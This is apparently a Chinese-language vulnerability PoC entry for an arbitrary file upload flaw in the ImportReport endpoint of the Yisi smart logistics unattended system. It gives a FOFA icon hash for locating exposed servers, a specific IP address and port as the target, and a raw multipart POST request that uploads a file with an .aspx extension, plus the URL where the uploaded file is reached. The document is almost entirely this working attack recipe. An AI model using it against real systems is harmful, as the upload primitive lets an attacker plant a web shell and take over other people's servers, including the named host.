# 易思软件-智能物流无人值守系统 ImportReport 任意文件上传

    ## fofa

```
icon_hash="2007842404"
```

## poc

http://111.59.196.173:8001//GRF/Custom/health.aspx

```
POST /Sys_ReportFile/ImportReport?encode=health HTTP/1.1 
Host: 111.59.196.173:8001
Content-Length: 203
X-File-Name: cves.grf
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary= ----WebKitFormBoundaryxzUhGld6cusN3Alk
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: currentmoduleId=; prevcurrentmoduleId=; ASP.NET_SessionId=dwgpzkmpqdwkgfefjcwxzr4f; __RequestVerificationToken=MuLUdOygmXaoLwVszqtimhifsVREHIu-alcI9SLBiM617s7kK1M1El1pgO6fm5yIs1_PU NSX-ZQAfk0baq_6cA6RGMPKc5K87XTsMDG2bSs1
Connection: close

------WebKitFormBoundaryxzUhGld6cusN3Alk
Content-Disposition: form-data; name="file"; filename="test.grf.aspx"
Content-Type: application/octet-stream

1112
------WebKitFormBoundaryxzUhGld6cusN3Alk--
```
